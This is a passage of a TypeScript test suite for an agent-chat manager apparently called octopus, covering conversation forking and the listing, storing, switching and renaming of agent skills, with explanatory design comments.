      forkSession: (id: string, options: { readonly dir: string }) => Promise<{ sessionId: string }>
    ): Promise<OctopusService> {
      return createService({ ...paths(dir), query: fakeQuery(), forkSession })
    }

    async function started(
      service: OctopusService
    ): Promise<{ workspaceId: string; chatId: string }> {
      const repo = join(dir, 'planner')
      await initRepo(repo)
      const project = await service.addProjectFromPath(repo)
      const workspace = await service.createWorkspaceIn(project.id)

      const chat = await service.openChat(workspace.id)
      await service.sendToChat(chat.id, 'the first thing')
      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspace.id)[0]?.sessionId).toBe('sess-1')
      })

      return { workspaceId: workspace.id, chatId: chat.id }
    }

    /*
     * A fork adds a record like any other, and it is the writer most easily
     * forgotten: the only one that starts by asking the agent, and the only one
     * whose fixtures live here rather than beside the other four.
     *
     * It reaches `commitChats` through the same `addChatCapped` that `createChat`
     * uses, so this asserts a shared line — worth a test all the same, because
     * "same line today" is not a promise about tomorrow.
     */
    it('says the set of conversations changed', async () => {
      const service = await forkingService(() => Promise.resolve({ sessionId: 'sess-forked' }))
      const { workspaceId, chatId } = await started(service)

      const changes: ChatsChangedEvent[] = []
      service.onChatsChanged((event) => changes.push(event))

      await service.forkChat(chatId)

      expect(changes).toEqual([{ workspaceId }])
    })

    it('asks the agent to fork, in the workspace’s own directory', async () => {
      const calls: { id: string; dir: string }[] = []
      const service = await forkingService((id, options) => {
        calls.push({ id, dir: options.dir })
        return Promise.resolve({ sessionId: 'sess-forked' })
      })
      const { workspaceId, chatId } = await started(service)
      const path = (await service.listWorkspaces('planner'))[0]?.path

      await service.forkChat(chatId)

      expect(calls).toEqual([{ id: 'sess-1', dir: path }])
      expect(service.listChats(workspaceId)).toHaveLength(2)
    })

    /*
     * Never the source's. Resuming continues a session in place and keeps its
     * id, so two records holding one would be two agent processes appending to
     * a single transcript.
     */
    it('stores the forked session rather than the one it came from', async () => {
      const service = await forkingService(() => Promise.resolve({ sessionId: 'sess-forked' }))
      const { workspaceId, chatId } = await started(service)

      const forked = await service.forkChat(chatId)

      expect(forked.sessionId).toBe('sess-forked')
      expect(service.listChats(workspaceId)[0]?.sessionId).toBe('sess-1')
    })

    // The agent's fork copies what the model remembers; this is what the screen
    // draws. Without it the new tab opens empty above an agent that remembers.
    it('copies the history the new conversation inherits', async () => {
      const service = await forkingService(() => Promise.resolve({ sessionId: 'sess-forked' }))
      const { chatId } = await started(service)

      const forked = await service.forkChat(chatId)

      // Entry for entry, the session's own opening included: what the new tab
      // draws has to be what the one it came from drew.
      await expect(service.chatHistory(forked.id)).resolves.toEqual(
        await service.chatHistory(chatId)
      )
    })

    it('refuses a conversation that has never run', async () => {
      const service = await forkingService(() => Promise.resolve({ sessionId: 'sess-forked' }))
      const repo = join(dir, 'planner')
      await initRepo(repo)
      const project = await service.addProjectFromPath(repo)
      const workspace = await service.createWorkspaceIn(project.id)
      const chat = await service.openChat(workspace.id)

      await expect(service.forkChat(chat.id)).rejects.toMatchObject({
        name: 'ChatError',
        code: 'nothingToFork'
      })
      expect(service.listChats(workspace.id)).toHaveLength(1)
    })

    // A half-made fork is worse than none: a tab that says it continues a
    // conversation and does not.
    it('writes no record when the agent cannot fork', async () => {
      const service = await forkingService(() => Promise.reject(new Error('no such session')))
      const { workspaceId, chatId } = await started(service)

      await expect(service.forkChat(chatId)).rejects.toMatchObject({
        name: 'ChatError',
        code: 'forkFailed'
      })
      expect(service.listChats(workspaceId)).toHaveLength(1)
    })

    it('honours the cap', async () => {
      const service = await forkingService(() => Promise.resolve({ sessionId: 'sess-forked' }))
      const { workspaceId, chatId } = await started(service)
      await service.createChat(workspaceId)
      await service.createChat(workspaceId)

      await expect(service.forkChat(chatId)).rejects.toMatchObject({ code: 'tooManyChats' })
    })

    it('refuses an id nothing answers to', async () => {
      const service = await forkingService(() => Promise.resolve({ sessionId: 'sess-forked' }))

      await expect(service.forkChat('chat-nowhere')).rejects.toBeInstanceOf(WorkspaceError)
    })

    describe('off a side answer', () => {
      const aside = { question: 'why  this\nway?', response: 'Because of the cache.' }

      interface Forked {
        readonly service: OctopusService
        readonly sourceId: string
        readonly forkId: string
        /** The fork's record as it stands now. */
        readonly record: () => Chat | undefined
      }

      /** A fork off `aside` of a conversation that ran, with `/deploy` among its commands. */
      async function forkedOff(): Promise<Forked> {
        offeredCommands = () =>
          Promise.resolve([
            { name: 'deploy', description: '', aliases: [] } as unknown as SlashCommand
          ])
        const service = await forkingService(() => Promise.resolve({ sessionId: 'sess-forked' }))
        const { workspaceId, chatId } = await started(service)
        await vi.waitFor(() => {
          expect(service.listChats(workspaceId)[0]?.knownCommands).toHaveLength(1)
        })
        const forked = await service.forkChat(chatId, aside)

        return {
          service,
          sourceId: chatId,
          forkId: forked.id,
          record: () => service.listChats(workspaceId).find((chat) => chat.id === forked.id)
        }
      }

      it('is named after the question and remembers the exchange', async () => {
        const { record } = await forkedOff()

        expect(record()).toMatchObject({ title: 'btw: why this way?', aside })
      })

      // What the CLI's own fork shows: the exchange as the last thing said.
      it('ends its history with the question and the answer', async () => {
        const { service, sourceId, forkId } = await forkedOff()

        const source = await service.chatHistory(sourceId)
        const history = await service.chatHistory(forkId)

        expect(history.slice(0, source.length)).toEqual(source)
        expect(history.slice(source.length)).toEqual([
          { role: 'user', at: expect.any(String), text: aside.question },
          { role: 'agent', at: expect.any(String), event: { type: 'text', text: aside.response } }
        ])
      })

      it('tells the agent with the first message, and only that one', async () => {
        const { service, forkId, record } = await forkedOff()

        await service.sendToChat(forkId, 'go on')
        await service.sendToChat(forkId, 'and then')

        expect(agents.at(-1)?.sent).toEqual([formatAside(aside, 'go on'), 'and then'])
        expect(record()?.aside).toBeNull()
        // The screen keeps what was typed.
        expect((await service.chatHistory(forkId)).at(-1)).toMatchObject({ text: 'and then' })
      })

      it('forgets it on a /clear, which goes as typed', async () => {
        const { service, forkId, record } = await forkedOff()

        await service.sendToChat(forkId, '/clear')

        expect(agents.at(-1)?.sent).toEqual(['/clear'])
        expect(record()?.aside).toBeNull()
      })

      // Text in front of a command would stop it being one.
      it('keeps it past another command', async () => {
        const { service, forkId, record } = await forkedOff()

        await service.sendToChat(forkId, '/deploy prod')
        expect(record()?.aside).toEqual(aside)
        await service.sendToChat(forkId, 'go on')

        expect(agents.at(-1)?.sent).toEqual(['/deploy prod', formatAside(aside, 'go on')])
      })
    })
  })

  describe('skills', () => {
    const DOCUMENT = '---\nname: review\ndescription: When reviewing.\n---\n\n# Review\n'

    /** A skill in the checkout, which is what the third group reads. */
    async function placeInRepo(root: string, name: string): Promise<void> {
      const path = join(root, '.claude', 'skills', name)
      await mkdir(path, { recursive: true })
      await writeFile(
        join(path, 'SKILL.md'),
        `---\nname: ${name}\ndescription: From the checkout.\n---\n\nBody\n`,
        'utf8'
      )
    }

    it('starts with nothing in either store', async () => {
      const { service, projectId } = await withWorkspace()

      await expect(service.listSkills({ kind: 'global' })).resolves.toEqual([])
      await expect(service.listSkills({ kind: 'project', projectId })).resolves.toEqual([])
    })

    /*
     * A skill is keyed by its bare name wherever it came from — `skillKey` says
     * so, and it is right: two `local-probe`s in different places came back
     * from a live session as a single row. But uniqueness was checked inside
     * one directory, so a global `review` and a project `review` were both
     * accepted, and after that the switch on either row moved both.
     */
    it('refuses a name the store beside this one already uses', async () => {
      const { service, projectId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', {
        kind: 'form',
        content: { description: 'The global one.', body: '# Review\n' }
      })

      const refused = service.saveStoredSkill({ kind: 'project', projectId }, 'review', {
        kind: 'form',
        content: { description: 'The project one.', body: '# Review\n' }
      })

      await expect(refused).rejects.toMatchObject({ code: 'skillExists' })
      await expect(service.listSkills({ kind: 'project', projectId })).resolves.toEqual([])
    })

    /*
     * The third source, and the last one in the namespace. A skill is keyed by
     * its bare name wherever it came from — measured against a live session, a
     * `local-probe` in a store and another in the checkout came back as one row
     * — so a repository shipping `review` and a skill written here called
     * `review` are two files for one skill, and the switch on either moves
     * both. The panel draws all three side by side, so the collision was
     * visible on screen while nothing prevented it.
     */
    it('refuses a name the checkout already ships', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const workspace = (await service.listWorkspaces(projectId))[0]
      if (!workspace) throw new Error('no workspace')
      await placeInRepo(workspace.path, 'review')
      expect(workspaceId).not.toBe('')

      const refused = service.saveStoredSkill({ kind: 'global' }, 'review', {
        kind: 'form',
        content: { description: 'Ours.', body: '# Review\n' }
      })

      await expect(refused).rejects.toMatchObject({ code: 'skillExists' })
    })

    /*
     * A project's own store meets only its own project's checkouts. A global
     * skill meets every project's, which is the difference the two arms make —
     * asserted from the narrow side, because the wide one passes either way.
     */
    it('does not refuse a project skill for a name another project’s checkout ships', async () => {
      const { service, projectId } = await withWorkspace()
      const elsewhere = join(dir, 'elsewhere')
      await initRepo(elsewhere)
      const other = await service.addProjectFromPath(elsewhere)
      const workspace = await service.createWorkspaceIn(other.id)
      await placeInRepo(workspace.path, 'review')

      await expect(
        service.saveStoredSkill({ kind: 'project', projectId }, 'review', {
          kind: 'form',
          content: { description: 'Ours.', body: '# Review\n' }
        })
      ).resolves.toMatchObject({ name: 'review' })
    })

    it('refuses an import of a name the other store already uses', async () => {
      const { service, projectId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'project', projectId }, 'review', {
        kind: 'form',
        content: { description: 'The project one.', body: '# Review\n' }
      })

      const refused = service.importStoredSkill(
        { kind: 'global' },
        { kind: 'text', text: DOCUMENT }
      )

      await expect(refused).rejects.toMatchObject({ code: 'skillExists' })
    })

    // Saving an edit is not creating one, and a skill must not be refused by
    // its own name.
    it('takes an edit to a skill that already exists', async () => {
      const { service } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', {
        kind: 'form',
        content: { description: 'First.', body: '# Review\n' }
      })

      await service.saveStoredSkill({ kind: 'global' }, 'review', {
        kind: 'form',
        content: { description: 'Second.', body: '# Review\n' }
      })

      await expect(service.listSkills({ kind: 'global' })).resolves.toMatchObject([
        { description: 'Second.' }
      ])
    })

    it('writes a skill the store then reads back', async () => {
      const { service } = await withWorkspace()

      await service.saveStoredSkill({ kind: 'global' }, 'review', {
        kind: 'form',
        content: { description: 'When reviewing.', body: '# Review\n' }
      })

      await expect(service.listSkills({ kind: 'global' })).resolves.toMatchObject([
        { name: 'review', description: 'When reviewing.' }
      ])
      await expect(service.readStoredSkill({ kind: 'global' }, 'review')).resolves.toMatchObject({
        body: '# Review\n'
      })
    })

    /*
     * The shape a session discovers skills in: a root with `.claude/skills`
     * inside it. Written anywhere else the skill is listed here and never
     * reaches an agent.
     */
    it('gives the store the shape a session reads on the first write', async () => {
      const { service } = await withWorkspace()

      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      await expect(
        readFile(join(dir, 'data', 'skills', '.claude', 'skills', 'review', 'SKILL.md'), 'utf8')
      ).resolves.toContain('name: review')
    })

    it('creates nothing merely by listing an empty store', async () => {
      const { service } = await withWorkspace()

      await service.listSkills({ kind: 'global' })

      await expect(stat(join(dir, 'data', 'skills'))).rejects.toThrow()
    })

    it('removes a skill', async () => {
      const { service } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      await service.removeStoredSkill({ kind: 'global' }, 'review')

      await expect(service.listSkills({ kind: 'global' })).resolves.toEqual([])
    })

    it('refuses a store belonging to a project that is not there', async () => {
      const { service } = await withWorkspace()

      await expect(service.listSkills({ kind: 'project', projectId: 'nowhere' })).rejects.toThrow()
    })

    it('imports pasted text, a file on disk and a download', async () => {
      const repo = join(dir, 'imports')
      await initRepo(repo)
      const file = join(dir, 'loose.md')
      await writeFile(file, '---\nname: from-disk\ndescription: On disk.\n---\n\nBody\n', 'utf8')

      const service = await createService({
        ...paths(dir),
        query: fakeQuery(),
        fetch: () =>
          Promise.resolve(
            new Response('---\nname: from-url\ndescription: Downloaded.\n---\n\nBody\n')
          )
      })
      await service.addProjectFromPath(repo)

      await service.importStoredSkill({ kind: 'global' }, { kind: 'text', text: DOCUMENT })
      await service.importStoredSkill({ kind: 'global' }, { kind: 'path', path: file })
      await service.importStoredSkill(
        { kind: 'global' },
        { kind: 'url', url: 'https://example.test/SKILL.md' }
      )

      await expect(service.listSkills({ kind: 'global' })).resolves.toMatchObject([
        { name: 'from-disk' },
        { name: 'from-url' },
        { name: 'review' }
      ])
    })

    it('lists all three sources for a conversation, each under the name the agent uses', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const workspace = (await service.listWorkspaces(projectId))[0]
      if (!workspace) throw new Error('no workspace')
      await placeInRepo(workspace.path, 'in-repo')

      await service.saveStoredSkill({ kind: 'global' }, 'everywhere', {
        kind: 'raw',
        text: DOCUMENT.replace('review', 'everywhere')
      })
      await service.saveStoredSkill({ kind: 'project', projectId }, 'here-only', {
        kind: 'raw',
        text: DOCUMENT.replace('review', 'here-only')
      })

      const chat = await service.openChat(workspaceId)

      await expect(service.skillsForChat(chat.id)).resolves.toMatchObject([
        { key: 'everywhere', scope: 'global', enabled: true },
        { key: 'here-only', scope: 'project', enabled: true },
        { key: 'in-repo', scope: 'repository', enabled: true }
      ])
    })

    /*
     * The panel read as a list of what this conversation may reach for and was
     * a list of what **octopus can see** — a different claim, and the
     * difference is invisible until somebody wonders why a skill they can see
     * the agent using is not on it. Claude Code's own bundled skills, the
     * user's `~/.claude/skills` and a plugin's are none of them in a directory
     * we look at.
     */
    it('lists what the session holds and the directories do not account for', async () => {
      const { service, workspaceId } = await withWorkspace()
      skillReload = () =>
        Promise.resolve({
          skills: [
            { name: 'dataviz', description: 'Charts.', argumentHint: '', builtin: true },
            {
              name: 'commit-commands:commit',
              description: '(commit-commands) Commit.',
              argumentHint: ''
            }
          ]
        })

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      // By name rather than in the CLI's order, each told where it came from.
      await expect(service.skillsForChat(chat.id)).resolves.toEqual([
        {
          // A plugin's key is `plugin:skill`, which is what the CLI knows it by
          // and therefore what an override has to name.
          key: 'commit-commands:commit',
          name: 'commit-commands:commit',
          description: 'Commit.',
          scope: 'session',
          source: 'plugin',
          enabled: true
        },
        {
          key: 'dataviz',
          name: 'dataviz',
          description: 'Charts.',
          scope: 'session',
          source: 'builtin',
          enabled: true
        }
      ])
    })

    /* One way only. A skill the session does not list is not missing: one with
       `paths:` in its frontmatter is offered where the work touches those paths
       and is legitimately absent, and drawing that as a problem would be wrong
       about every path-scoped skill in the repository. */
    it('does not list a skill twice when the session names one we wrote', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
      skillReload = () =>
        Promise.resolve({ skills: [{ name: 'review', description: 'Ours.', argumentHint: '' }] })

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await expect(service.skillsForChat(chat.id)).resolves.toMatchObject([
        { key: 'review', scope: 'global' }
      ])
    })

    /* Before the first message there is nothing that could answer, which is
       honest rather than a gap. */
    it('has no fourth group before a session exists to be asked', async () => {
      const { service, workspaceId } = await withWorkspace()
      skillReload = () =>
        Promise.resolve({ skills: [{ name: 'dataviz', description: 'Charts.', argumentHint: '' }] })

      const chat = await service.openChat(workspaceId)

      await expect(service.skillsForChat(chat.id)).resolves.toEqual([])
    })

    /* A session that will not answer is a fourth group missing, not a panel
       that fails: the three above it are read from disk and still true. */
    it('draws the rest when the session will not say what it holds', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      skillReload = () => Promise.reject(new Error('the transport is closed'))

      await expect(service.skillsForChat(chat.id)).resolves.toMatchObject([
        { key: 'review', scope: 'global' }
      ])
    })

    /* A switch over the fourth group is not decoration: `skillOverrides` names
       a skill by the key the CLI knows it by, and that is what these carry. */
    it('switches off a skill it did not write', async () => {
      const { service, workspaceId } = await withWorkspace()
      skillReload = () =>
        Promise.resolve({ skills: [{ name: 'dataviz', description: 'Charts.', argumentHint: '' }] })

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      await service.setChatSkill(chat.id, 'dataviz', false)

      expect((await service.skillsForChat(chat.id))[0]?.enabled).toBe(false)
      expect(agent().flagSettings().at(-1)).toMatchObject({
        skillOverrides: { dataviz: 'off' }
      })
    })

    /*
     * Two switches flipped in quick succession used to keep one. Each built the
     * whole map from the record as it read it before its own write, so the
     * second, read before the first landed, wrote the first key back — and told
     * the session the same truncated map.
     */
    it('keeps both of two switches flipped together', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await Promise.all([
        service.setChatSkill(chat.id, 'loop', false),
        service.setChatSkill(chat.id, 'dataviz', false)
      ])

      const stored = service.listChats(workspaceId).find((one) => one.id === chat.id)
      expect(stored?.skillOverrides).toEqual({ loop: false, dataviz: false })
      expect(agent().flagSettings().at(-1)?.skillOverrides).toEqual({
        loop: 'off',
        dataviz: 'off'
      })
    })

    /*
     * A session leaves a skill it withholds out of its answer, name and
     * description both. Built from that answer alone, the panel lost the row
     * the moment its switch was used, and with it the only way back on.
     */
    describe('a switched-off skill of the session\u2019s own', () => {
      const loop = {
        name: 'loop',
        description: 'Run it on a loop.',
        argumentHint: '',
        builtin: true
      }
      const dataviz = { name: 'dataviz', description: 'Charts.', argumentHint: '', builtin: true }

      /** A conversation whose session has described both, then withholds `loop`. */
      async function withLoopOff(): Promise<{ service: OctopusService; chatId: string }> {
        const { service, workspaceId } = await withWorkspace()
        skillReload = () => Promise.resolve({ skills: [loop, dataviz] })

        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'work')
        await service.skillsForChat(chat.id)
        await service.setChatSkill(chat.id, 'loop', false)
        skillReload = () => Promise.resolve({ skills: [dataviz] })

        return { service, chatId: chat.id }
      }

      it('stays listed, off, as the session last described it', async () => {
        const { service, chatId } = await withLoopOff()

        await expect(service.skillsForChat(chatId)).resolves.toEqual([
          {
            key: 'dataviz',
            name: 'dataviz',
            description: 'Charts.',
            scope: 'session',
            source: 'builtin',
            enabled: true
          },
          {
            key: 'loop',
            name: 'loop',
            description: 'Run it on a loop.',
            scope: 'session',
            source: 'builtin',
            enabled: false
          }
        ])
      })

      /* The map used to be rebuilt from the answer, which no longer named it. */
      it('stays withheld when another skill is switched', async () => {
        const { service, chatId } = await withLoopOff()

        await service.setChatSkill(chatId, 'dataviz', false)

        expect(agent().flagSettings().at(-1)?.skillOverrides).toEqual({
          loop: 'off',
          dataviz: 'off'
        })
      })

      it('can be switched back on from its row', async () => {
        const { service, chatId } = await withLoopOff()

        await service.setChatSkill(chatId, 'loop', true)

        expect(agent().flagSettings().at(-1)?.skillOverrides).toEqual({ loop: 'on' })
      })

      /* From the answer, not the memory, which may be older. */
      it('is drawn once, as the session says it, while the session still names it', async () => {
        const { service, chatId } = await withLoopOff()
        await service.setChatSkill(chatId, 'loop', false)
        skillReload = () =>
          Promise.resolve({ skills: [{ ...loop, description: 'Reworded.' }, dataviz] })

        const listing = await service.skillsForChat(chatId)

        expect(listing.map((skill) => skill.key)).toEqual(['dataviz', 'loop'])
        expect(listing[1]?.description).toBe('Reworded.')
      })

      /* Only beside an answer: the group exists once a session does. */
      it('is not drawn when the session will not answer', async () => {
        const { service, chatId } = await withLoopOff()
        skillReload = () => Promise.reject(new Error('the transport is closed'))

        await expect(service.skillsForChat(chatId)).resolves.toEqual([])
      })

      /*
       * A record switched off before anything was remembered — or a skill
       * deleted while it was off. Drawn either way: a stale row goes when it is
       * switched on, while a withhold with no row could never be undone.
       */
      it('is drawn by name alone when no session ever described it', async () => {
        const { service, chatId } = await withLoopOff()
        await service.setChatSkill(chatId, 'gone', false)

        await expect(service.skillsForChat(chatId)).resolves.toContainEqual({
          key: 'gone',
          name: 'gone',
          description: '',
          scope: 'session',
          source: 'own',
          enabled: false
        })
      })

      /* A plugin's skill is never withheld: missing from the answer, it is gone. */
      it('does not draw a plugin\u2019s skill the answer no longer names', async () => {
        const { service, chatId } = await withLoopOff()
        await service.setChatSkill(chatId, 'tools:lint', false)

        expect((await service.skillsForChat(chatId)).map((skill) => skill.key)).toEqual([
          'dataviz',
          'loop'
        ])
      })

      /* The default lists are edited in settings, which lists our directories. */
      it('does not draw a key the default lists switch off', async () => {
        const { service, chatId } = await withLoopOff()
        await service.updateConfig({ disabledSkillDefaults: ['review'] })

        expect((await service.skillsForChat(chatId)).map((skill) => skill.key)).toEqual([
          'dataviz',
          'loop'
        ])
      })

      /* Ours are read from disk every time, and a checkout's remembered here
         would turn up as the session's in a workspace without it. */
      it('remembers only what the directories do not hold', async () => {
        const { service, workspaceId } = await withWorkspace()
        await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
        skillReload = () =>
          Promise.resolve({
            skills: [{ name: 'review', description: 'Ours.', argumentHint: '' }, dataviz]
          })

        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'work')
        await service.skillsForChat(chat.id)

        const stored = JSON.parse(await readFile(join(dir, 'state.json'), 'utf8')) as {
          knownSkills: { name: string }[]
        }
        expect(stored.knownSkills.map((skill) => skill.name)).toEqual(['dataviz'])
      })

      it('is remembered in the state file, which is written only when the answer is new', async () => {
        const { service, chatId } = await withLoopOff()
        const file = join(dir, 'state.json')

        const stored = JSON.parse(await readFile(file, 'utf8')) as { knownSkills: unknown }
        expect(stored.knownSkills).toEqual([
          { name: 'loop', description: 'Run it on a loop.', builtin: true },
          { name: 'dataviz', description: 'Charts.', builtin: true }
        ])

        const before = (await stat(file)).mtimeMs
        await service.skillsForChat(chatId)
        expect((await stat(file)).mtimeMs).toBe(before)
      })
    })

    /*
     * The start-up map used to be built before there was any answer to build
     * it from, so after a restart a skill of the session's own that somebody
     * had switched off was offered anyway — with its switch still drawn off.
     */
    it('withholds a skill of the session\u2019s own from the moment a session starts', async () => {
      const { service, workspaceId } = await withWorkspace()

      const chat = await service.openChat(workspaceId)
      await service.setChatSkill(chat.id, 'loop', false)
      await service.sendToChat(chat.id, 'hello')

      expect(agents[0]?.options().settings).toMatchObject({ skillOverrides: { loop: 'off' } })
    })

    /*
     * The CLI ignores `skillOverrides` for a plugin's skill, so the record's
     * `false` — one left from before the panel stopped offering the switch —
     * is not what the session does, and the row says what it does.
     */
    it('draws a plugin\u2019s skill as on whatever the record says', async () => {
      const { service, workspaceId } = await withWorkspace()
      skillReload = () =>
        Promise.resolve({
          skills: [{ name: 'commit-commands:commit', description: 'Commit.', argumentHint: '' }]
        })

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      await service.setChatSkill(chat.id, 'commit-commands:commit', false)

      await expect(service.skillsForChat(chat.id)).resolves.toMatchObject([
        { key: 'commit-commands:commit', source: 'plugin', enabled: true }
      ])
    })

    /* The write does not ask the session anything: the map comes from the
       record, so a session that cannot say what it holds still takes it. */
    it('still switches off what it wrote when the session will not answer', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      skillReload = () => Promise.reject(new Error('the transport is closed'))

      await service.setChatSkill(chat.id, 'review', false)

      expect(agent().flagSettings().at(-1)).toMatchObject({ skillOverrides: { review: 'off' } })
    })

    /*
     * Listed whatever the Agent setting says, unlike the panel's own group: a
     * settings dialog is about files that are there either way and can be
     * taken a copy of, while the panel is about one conversation.
     */
    it("lists the checkout's own so one can be copied out", async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const workspace = (await service.listWorkspaces(projectId))[0]
      if (!workspace) throw new Error('no workspace')
      await placeInRepo(workspace.path, 'in-repo')

      await service.updateConfig({ settingSources: 'none' })

      await expect(service.listRepositorySkills(workspaceId)).resolves.toMatchObject([
        { name: 'in-repo', description: 'From the checkout.' }
      ])
    })

    it('refuses to read a checkout that is not there', async () => {
      const { service } = await withWorkspace()

      await expect(service.listRepositorySkills('planner/nowhere')).rejects.toBeInstanceOf(
        WorkspaceError
      )
    })

    /*
     * A switch over something the session would not load is a control with
     * nothing behind it — and ours are in that boat too, since a store reaches
     * a session as an extra working-directory root rather than as a plugin. A
     * plugin would have escaped the gate and was tried: its skills load and
     * then cannot be switched off, which is the whole feature. So "load
     * nothing" means what it says, skills included.
     */
    it('offers nothing at all when the settings would load nothing', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const workspace = (await service.listWorkspaces(projectId))[0]
      if (!workspace) throw new Error('no workspace')
      await placeInRepo(workspace.path, 'in-repo')
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      await service.updateConfig({ settingSources: 'none' })
      const chat = await service.openChat(workspaceId)

      await expect(service.skillsForChat(chat.id)).resolves.toEqual([])

      /*
       * And neither **store** goes over, which is the one case where omitting
       * one is still right: with no project layer in `settingSources` the SDK
       * reads no `.claude/skills` under any root, so a root there would widen
       * what the session may reach and buy nothing at all.
       *
       * The attachments directory is not in that boat and goes over anyway. It
       * has nothing to do with `settingSources` — nobody reads a `.claude`
       * under it — and what it buys is a pasted screenshot the agent can read
       * without asking. "Load nothing" is a statement about instructions, not
       * about the files a message points at.
       */
      await service.sendToChat(chat.id, 'hello')
      expect(agents[0]?.options().additionalDirectories).toEqual([join(dir, 'data', 'attachments')])
    })

    /*
     * `openChat` is lazy, so a fresh workspace has no record to ask about —
     * and a fresh workspace is exactly where somebody opens the panel first.
     * Nothing has been said about any skill yet, so the defaults are the whole
     * answer, and asking must not create a conversation to give it.
     */
    it('answers for a workspace whose first message has not been sent', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const workspace = (await service.listWorkspaces(projectId))[0]
      if (!workspace) throw new Error('no workspace')
      await placeInRepo(workspace.path, 'in-repo')
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })

      await expect(service.skillsForWorkspace(workspaceId)).resolves.toMatchObject([
        { key: 'review', scope: 'global', enabled: true },
        { key: 'in-repo', scope: 'repository', enabled: true }
      ])
      expect(service.listChats(workspaceId)).toHaveLength(0)
    })

    it('reads the default lists for a workspace as well as for a conversation', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })

      expect((await service.skillsForWorkspace(workspaceId))[0]?.enabled).toBe(false)
    })

    it('refuses to answer for a workspace that is not there', async () => {
      const { service } = await withWorkspace()

      await expect(service.skillsForWorkspace('planner/nowhere')).rejects.toBeInstanceOf(
        WorkspaceError
      )
    })

    /*
     * The whole of why a rename is a migration rather than an edit. The name is
     * the key three stored answers use, and `skillEnabled` reads a key no list
     * mentions as **on** — so a rename that moved only the directory would look
     * like it worked and quietly switch the skill back on everywhere somebody
     * had turned it off.
     */
    it('moves every answer stored against a skill when it is renamed', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
      await service.updateConfig({ disabledSkillDefaults: ['review'] })
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })

      const chat = await service.openChat(workspaceId)
      await service.setChatSkill(chat.id, 'review', true)

      await service.renameStoredSkill({ kind: 'global' }, 'review', 'reviewer')

      expect(service.getConfig().disabledSkillDefaults).toEqual(['reviewer'])
      expect(service.listProjects()[0]?.disabledSkillDefaults).toEqual(['reviewer'])
      expect(service.listChats(workspaceId)[0]?.skillOverrides).toEqual({ reviewer: true })
    })

    // And the skill is still off by default afterwards, which is the property
    // the three moves exist for rather than the moves themselves.
    it('keeps a renamed skill switched off where it was switched off', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      await service.saveStoredSkill({ kind: 'global' }, 'review', { kind: 'raw', text: DOCUMENT })
      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })

      await service.renameStoredSkill({ kind: 'global' }, 'review', 'reviewer')

      await expect(service.skillsForWorkspace(workspaceId)).resolves.toMatchObject([
        { key: 'reviewer', enabled: false }
      ])
    })

    /*
     * A running conversation hears about each of these at once, as it does
     * about its own switch. The panel reads the record, so a session left on
     * the map it started with was a switch that looks broken.
     */
    it('tells a running conversation when the installation\u2019s defaults change', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.updateConfig({ disabledSkillDefaults: ['review'] })

      expect(agent().flagSettings().at(-1)?.skillOverrides).toEqual({ review: 'off' })
    })

    // The way the window switches one: an edit, not a whole list.
    it('tells a running conversation when one installation default is switched', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.editConfig({ kind: 'skillDefault', key: 'review', enabled: false })

      expect(agent().flagSettings().at(-1)?.skillOverrides).toEqual({ review: 'off' })
    })

    it('tells a running conversation when its project\u2019s defaults change', async () => {
      const { service, projectId, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      await service.editProjectById(projectId, {
        kind: 'skillDefault',
        key: 'review',
        enabled: false
      })

      expect(agent().flagSettings().at(-1)?.skillOverrides).toEqual({ review: 'off' })
    })

    // The other direction is the one the flag layer does not undo by itself:
